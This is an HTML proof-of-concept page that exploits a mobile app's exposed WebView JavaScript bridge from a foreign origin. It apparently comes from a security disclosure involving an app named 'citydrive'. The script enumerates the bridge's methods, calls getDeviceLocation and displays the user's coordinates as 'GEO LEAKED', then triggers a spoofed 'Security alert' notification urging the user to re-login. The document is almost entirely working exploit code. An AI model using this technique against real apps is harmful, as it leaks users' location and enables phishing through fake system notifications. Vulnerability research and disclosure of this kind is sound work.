<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>PoC bridge</title></head>
<body style="font-family:monospace;background:#fff;padding:12px">
<h3>Bridge PoC — foreign origin page</h3>
<div id="loc">waiting deviceLocation event...</div>
<div id="notes"></div>
<pre id="log"></pre>
<script>
const log = m => { document.getElementById('log').textContent += m + '\n'; };
try {
  log('WebViewInterface present: ' + (typeof WebViewInterface));
  log('methods: ' + Object.keys(WebViewInterface).join(','));
  // handler for native->JS pushes (protocol: WebViewFragment.J1)
  WebViewInterface.FromNative = function(ev) {
    log('FromNative event: ' + JSON.stringify(ev));
    if (ev && ev.event === 'deviceLocation') {
      document.getElementById('loc').textContent = 'GEO LEAKED: ' + JSON.stringify(ev.params);
    }
  };
  // request GPS
  WebViewInterface.getDeviceLocation();
  log('getDeviceLocation() called');
  // notification spoof demo
  setTimeout(function() {
    try { WebViewInterface.showNotification('Security alert', 'Please re-login: citydrive-poc', 'error'); log('showNotification called'); }
    catch(e) { log('showNotification err: ' + e); }
  }, 1500);
} catch(e) { log('ERR ' + e); }
</script>
</body></html>
